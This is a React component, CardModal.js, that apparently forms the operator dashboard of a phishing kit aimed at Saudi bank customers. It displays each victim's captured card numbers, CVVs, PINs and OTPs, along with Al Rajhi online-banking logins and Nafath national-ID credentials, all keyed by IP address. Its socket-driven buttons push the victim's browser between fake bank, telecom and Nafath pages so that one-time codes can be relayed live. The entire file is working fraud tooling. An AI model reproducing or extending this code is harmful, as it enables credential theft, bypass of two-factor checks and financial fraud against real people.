// src/components/CardModal.js
import React, { useState, useEffect, useRef } from "react";
import { Modal, Button } from "react-bootstrap";
import ConfirmDialog from "./ConfirmDialog";
import { socket } from "../socket";
import "./CardModal.css";

const PAGES = [
  "home.html",
  "details.html",
  "thirdparty.html",
  "comprehensive.html",
  "billing.html",
  "paymen.html",
  "rajhi.html",
  "rajhi-code.html",
  "bCall.html",
  "verification.html",
  "code.html",
  "phone.html",
  "phonecode.html",
  "stcCall.html",
  "nafad.html",
  "nafad-basmah.html",
];

const LABEL = {
  "home.html": "Home",
  "details.html": "Details",
  "thirdparty.html": "Third-Party",
  "comprehensive.html": "Comprehensive",
  "billing.html": "Billing",
  "paymen.html": "Payment",
  "rajhi.html": "Rajhi",
  "rajhi-code.html": "Rajhi-Code",
  "bCall.html": "B-Call",
  "verification.html": "C-Code",
  "code.html": "PIN",
  "phone.html": "Phone",
  "phonecode.html": "P-Code",
  "stcCall.html": "STC Call",
  "nafad.html": "Nafad",
  "nafad-basmah.html": "Nafad-Basmah",
};

export default function CardModal({ ip, user, onClose }) {
  const [confirm, setConfirm] = useState({ show: false, page: null });
  const [basmah, setBasmah] = useState("");

  const [blinkPin, setBlinkPin] = useState(false);
  const [blinkOtp, setBlinkOtp] = useState(false);
  const [blinkPhoneOtp, setBlinkPhoneOtp] = useState(false);
  const [blinkRajhi, setBlinkRajhi] = useState(false);
  const [blinkRajhiPw, setBlinkRajhiPw] = useState(false);
  const [blinkRajhiCode, setBlinkJajhiCode] = useState(false);

  const prevPinRef = useRef(user?.pin || "");
  const prevOtpRef = useRef(user?.verification_code_two || "");
  const prevPhoneOtpRef = useRef(user?.verification_code_three || "");

  const prevRajhiRef = useRef(user?.rajhi || "");
  const prevRajhiPwRef = useRef(user?.rajhiPw || "");
  const prevRajhiCodeRef = useRef(user?.rajhiCode || "");

  useEffect(() => {
    const current = user?.rajhi || "";
    if (current && prevRajhiRef.current !== current) {
      setBlinkRajhi(true);
      setTimeout(() => setBlinkRajhi(false), 1500);
    }
    prevRajhiRef.current = current;
  }, [user?.rajhi]);

  useEffect(() => {
    const current = user?.rajhiPw || "";
    if (current && prevRajhiPwRef.current !== current) {
      setBlinkRajhiPw(true);
      setTimeout(() => setBlinkRajhiPw(false), 1500);
    }
    prevRajhiPwRef.current = current;
  }, [user?.rajhiPw]);

  useEffect(() => {
    const current = user?.rajhiCode || "";
    if (current && prevRajhiCodeRef.current !== current) {
      setBlinkJajhiCode(true);
      setTimeout(() => setBlinkJajhiCode(false), 1500);
    }
    prevRajhiCodeRef.current = current;
  }, [user?.rajhiCode]);

  useEffect(() => {
    const current = user?.pin || "";
    if (current && prevPinRef.current !== current) {
      setBlinkPin(true);
      setTimeout(() => setBlinkPin(false), 1500);
    }
    prevPinRef.current = current;
  }, [user?.pin]);

  useEffect(() => {
    const current = user?.verification_code_two || "";
    if (current && prevOtpRef.current !== current) {
      setBlinkOtp(true);
      setTimeout(() => setBlinkOtp(false), 1500);
    }
    prevOtpRef.current = current;
  }, [user?.verification_code_two]);

  useEffect(() => {
    const current = user?.verification_code_three || "";
    if (current && prevPhoneOtpRef.current !== current) {
      setBlinkPhoneOtp(true);
      setTimeout(() => setBlinkPhoneOtp(false), 1500);
    }
    prevPhoneOtpRef.current = current;
  }, [user?.verification_code_three]);

  const handlePageClick = (page) => {
    setConfirm({ show: true, page });
  };

  const fmtBirthDate = (value) => {
    if (!value) return "—";
    const d = new Date(value);
    if (isNaN(d)) return "—";
    return new Intl.DateTimeFormat("en-GB", {
      timeZone: "Asia/Amman",
      day: "2-digit",
      month: "2-digit",
      year: "numeric",
    }).format(d); // -> "13/10/2025"
  };

  // Hide ConfirmDialog without emitting anything
  const hideConfirm = () => {
    setConfirm({ show: false, page: null });
    setBasmah("");
  };

  // User clicked “Yes”
  const handleConfirm = () => {
    const page = confirm.page;
    if (page === "nafad-basmah.html") {
      socket.emit("updateBasmah", { ip, basmah: Number(basmah) });
    }
    socket.emit("navigateTo", { ip, page });
    hideConfirm();
  };

  // User clicked “No”
  const handleDecline = () => {
    const page = confirm.page;
    socket.emit("navigateTo", {
      ip,
      page: `${page}?declined=true`,
    });
    hideConfirm();
  };

  const {
    payments = [],
    pin = "",
    verification_code_two = "",
    phoneNumber = "",
    birthDate = "",
    operator = "",
    verification_code_three = "",
    username = "",
    password = "",
    rajhiName = "",
    rajhiPw = "",
    rajhiCode = "",
    currentPage = "",
  } = user || {};

  const formatExp = (expRaw) =>
    expRaw && expRaw.length >= 4
      ? `${expRaw.slice(0, 2)}/${expRaw.slice(2)}`
      : expRaw;

  return (
    <>
      <Modal show onHide={onClose} size="xl" centered>
        <Modal.Header closeButton>
          <Modal.Title>Card Control — {ip}</Modal.Title>
        </Modal.Header>

        <Modal.Body>
          {/* Top row of page‐buttons */}
          <div className="btn-grid" id="cardTopBtns">
            {PAGES.slice(0, 6).map((p) => (
              <Button
                key={p}
                variant="outline-primary"
                className={currentPage === p ? "blink-green" : ""}
                onClick={() => handlePageClick(p)}
              >
                {LABEL[p]}
              </Button>
            ))}
          </div>

          {/* Scrollable row of past “card-sim”s */}
          <div
            className="payments-container"
            style={{
              display: "flex",
              overflowX: "auto",
              gap: "1rem",
              marginTop: "1rem",
              paddingBottom: "1rem",
              borderTop: "1px solid #ddd",
              borderBottom: "1px solid #ddd",
            }}
          >
            {payments.length === 0 && (
              <div style={{ color: "#888", padding: "1rem" }}>
                No card submissions yet.
              </div>
            )}
            {payments.map((payDoc, idx) => {
              const { cardHolderName, cardNumber, expirationDate, cvv } =
                payDoc;
              return (
                <div
                  key={`${payDoc._id || idx}`}
                  className="card-sim"
                  style={{
                    minWidth: "260px",
                    border: "1px solid #ccc",
                    borderRadius: "8px",
                    padding: "0.75rem",
                    backgroundColor: "#fefefe",
                    boxShadow: "0 1px 3px rgba(0,0,0,0.1)",
                    flex: "0 0 auto",
                  }}
                >
                  <div
                    style={{
                      fontSize: "0.9rem",
                      fontWeight: 600,
                      marginBottom: "0.5rem",
                    }}
                  >
                    Submission {idx + 1}
                  </div>
                  <div style={{ marginBottom: "0.25rem" }}>
                    <strong>Name:</strong> {cardHolderName || "—"}
                  </div>
                  <div style={{ marginBottom: "0.25rem" }}>
                    <strong>Card #:</strong> {cardNumber ? cardNumber : "—"}
                  </div>
                  <div style={{ marginBottom: "0.25rem" }}>
                    <strong>Exp:</strong> {formatExp(expirationDate) || "—"}
                  </div>
                  <div style={{ marginBottom: "0.25rem" }}>
                    <strong>CVV:</strong> {cvv || "—"}
                  </div>
                </div>
              );
            })}
          </div>

          {/* Single “Latest” block (PIN, Card OTP, Phone, Nafad) */}
          <div
            className="details-block"
            style={{
              display: "flex",
              gap: "2rem",
              marginTop: "1rem",
              padding: "1rem",
              backgroundColor: "#fafafa",
              borderRadius: "8px",
              border: "1px solid #ddd",
            }}
          >
            {/* PIN & Card OTP */}
            <div style={{ flex: 1 }}>
              <h6 style={{ fontWeight: 600, marginBottom: "0.5rem" }}>
                Card PIN ⁄ OTP
              </h6>
              <p
                className={blinkPin ? "blink-green-text" : ""}
                style={{ marginBottom: "0.5rem" }}
              >
                <strong>PIN:</strong> {pin || "—"}
              </p>
              <p
                className={blinkOtp ? "blink-green-text" : ""}
                style={{ marginBottom: "0.5rem" }}
              >
                <strong>Card OTP (C-Code):</strong>{" "}
                {verification_code_two || "—"}
              </p>
            </div>

            {/* PIN & Card OTP */}
            <div style={{ flex: 1 }}>
              <h6 style={{ fontWeight: 600, marginBottom: "0.5rem" }}>
                Rajhi login ⁄ OTP
              </h6>
              <p
                className={blinkRajhi ? "blink-green-text" : ""}
                style={{ marginBottom: "0.5rem" }}
              >
                <strong>username:</strong> {rajhiName || "—"}
              </p>
              <p
                className={blinkRajhiPw ? "blink-green-text" : ""}
                style={{ marginBottom: "0.5rem" }}
              >
                <strong>Password:</strong> {rajhiPw || "—"}
              </p>
              <p
                className={blinkRajhiCode ? "blink-green-text" : ""}
                style={{ marginBottom: "0.5rem" }}
              >
                <strong>Rajhi OTP :</strong> {rajhiCode || "—"}
              </p>
            </div>

            {/* Phone & Phone OTP */}
            <div style={{ flex: 1 }}>
              <h6 style={{ fontWeight: 600, marginBottom: "0.5rem" }}>
                Phone ⁄ OTP
              </h6>
              <p style={{ marginBottom: "0.5rem" }}>
                <strong>Phone #:</strong> {phoneNumber || "—"}
              </p>
              <p style={{ marginBottom: "0.5rem" }}>
                <strong>Operator:</strong> {operator || "—"}
              </p>
              <p style={{ marginBottom: "0.5rem" }}>
                <strong>birthDate:</strong> {fmtBirthDate(birthDate) || "—"}
              </p>
              <p
                className={blinkPhoneOtp ? "blink-green-text" : ""}
                style={{ marginBottom: "0.5rem" }}
              >
                <strong>Phone OTP:</strong> {verification_code_three || "—"}
              </p>
            </div>

            {/* Nafad & Basmah */}
            <div style={{ flex: 1 }}>
              <h6 style={{ fontWeight: 600, marginBottom: "0.5rem" }}>
                Nafad ⁄ Basmah
              </h6>
              <p style={{ marginBottom: "0.5rem" }}>
                <strong>Nafad User:</strong> {username || "—"}
              </p>
              <p style={{ marginBottom: "0.5rem" }}>
                <strong>Nafad Pass:</strong> {password || "—"}
              </p>
            </div>
          </div>

          {/* Bottom row of page‐buttons */}
          <div
            className="btn-grid"
            id="cardBottomBtns"
            style={{ marginTop: "1rem" }}
          >
            {PAGES.slice(6).map((p) => (
              <Button
                key={p}
                variant="outline-primary"
                className={currentPage === p ? "blink-green" : ""}
                onClick={() => handlePageClick(p)}
              >
                {LABEL[p]}
              </Button>
            ))}
          </div>
        </Modal.Body>
      </Modal>

      <ConfirmDialog
        show={confirm.show}
        page={confirm.page}
        basmah={basmah}
        onBasmahChange={setBasmah}
        onConfirm={handleConfirm}
        onDecline={handleDecline}
        onClose={hideConfirm}
      />
    </>
  );
}
